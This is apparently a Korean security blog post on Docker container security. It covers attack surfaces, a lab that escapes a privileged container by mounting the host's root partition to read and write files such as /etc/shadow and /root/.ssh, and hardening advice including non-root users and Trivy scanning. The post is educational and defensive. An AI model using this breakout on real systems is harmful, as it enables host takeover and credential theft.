---
layout: post
title: "Docker 공부: 컨테이너 보안과 탈출 기법"
date: 2025-09-29 17:00:00 +0900
categories: [system-hacking]
tags: [Docker, Container Security, Privilege Escalation, Cloud Security]
description: "Docker 컨테이너 환경의 주요 보안 위협, 컨테이너 탈출(Breakout) 기법 및 보안 강화 방안"
---

## 1. 개요

**Docker**와 같은 컨테이너 기술은 편리함과 효율성을 제공하지만, 호스트 운영체제의 커널을 공유한다는 구조적 특성 때문에 가상 머신(VM)과는 다른 보안 위협이 존재합니다.
특히 컨테이너 내부에서 호스트 시스템으로 권한을 획득하는 **컨테이너 탈출(Container Breakout)** 공격은 클라우드 환경에서 매우 치명적입니다.

---

## 2. 주요 공격 표면 (Attack Surfaces)

### 2.1. 이미지 취약점 (Supply Chain)
Docker Hub 등에서 다운로드한 베이스 이미지 자체에 악성코드나 취약한 라이브러리(CVE)가 포함되어 있을 수 있습니다.
*   **대응**: `Trivy`, `Clair` 같은 이미지 스캐너를 CI/CD 파이프라인에 통합하여 배포 전 검사합니다.

### 2.2. 잘못된 설정 (Misconfiguration)
*   **Privileged Mode**: `--privileged` 플래그로 실행된 컨테이너는 호스트의 모든 장치에 접근할 수 있어 탈출이 매우 쉽습니다.
*   **Docker Socket Mount**: `/var/run/docker.sock`을 컨테이너에 마운트하면, 컨테이너 내부에서 호스트의 Docker 데몬을 제어하여 새로운 컨테이너를 생성하거나 호스트를 장악할 수 있습니다.

---

## 3. 실습: 컨테이너 탈출 (Privileged Mode)

`--privileged` 모드로 실행된 컨테이너에서 호스트의 파일 시스템에 접근하는 시나리오입니다.

### 3.1. 취약한 컨테이너 실행
```bash
docker run -d --privileged --name vulnerable-container ubuntu sleep 3600
```

### 3.2. 공격 실행 (컨테이너 내부)
1.  컨테이너 내부로 진입합니다.
    ```bash
    docker exec -it vulnerable-container /bin/bash
    ```
2.  호스트의 디스크 장치를 확인합니다. (`fdisk -l`)
3.  호스트의 루트 파티션(예: `/dev/sda1`)을 컨테이너 내부의 디렉터리로 마운트합니다.
    ```bash
    mkdir /mnt/host
    mount /dev/sda1 /mnt/host
    ```
4.  이제 `/mnt/host` 경로를 통해 호스트의 모든 파일(`/etc/shadow`, `/root/.ssh` 등)을 읽고 쓸 수 있습니다.

   ![Docker_Breakout](/assets/images/system-hacking/Docker_Breakout.png)

---

## 4. Dockerfile 보안 모범 사례

안전한 이미지를 빌드하기 위해 Dockerfile 작성 시 다음 규칙을 준수해야 합니다.

### 4.1. Root가 아닌 사용자로 실행
기본적으로 컨테이너는 root 권한으로 실행됩니다. 이를 방지하기 위해 사용자를 명시적으로 생성하고 전환해야 합니다.

```dockerfile
# 사용자 생성 및 전환
RUN useradd -m appuser
USER appuser

# 이후 실행되는 명령어는 appuser 권한으로 실행됨
CMD ["python", "app.py"]
```

### 4.2. 민감 정보 포함 금지
API 키나 비밀번호를 `ENV`로 하드코딩하거나 이미지 내에 파일로 복사하지 마십시오. `Docker Secrets`나 런타임 환경 변수 주입을 사용해야 합니다.

### 4.3. 신뢰할 수 있는 베이스 이미지 사용
공식 이미지(Official Image)를 사용하고, 태그를 `latest` 대신 구체적인 버전(예: `python:3.9-slim`)으로 명시하여 불필요한 패키지 설치를 최소화합니다.

---

## 5. 보안 도구 활용: Trivy

**Trivy**는 컨테이너 이미지, 파일 시스템, Git 저장소의 취약점을 스캔하는 강력한 도구입니다.

```bash
# 이미지 스캔
trivy image python:3.4-alpine
```

스캔 결과로 발견된 CVE 목록과 심각도(Critical, High 등)를 확인하고, 패치된 버전으로 이미지를 업데이트해야 합니다.

<hr class="short-rule">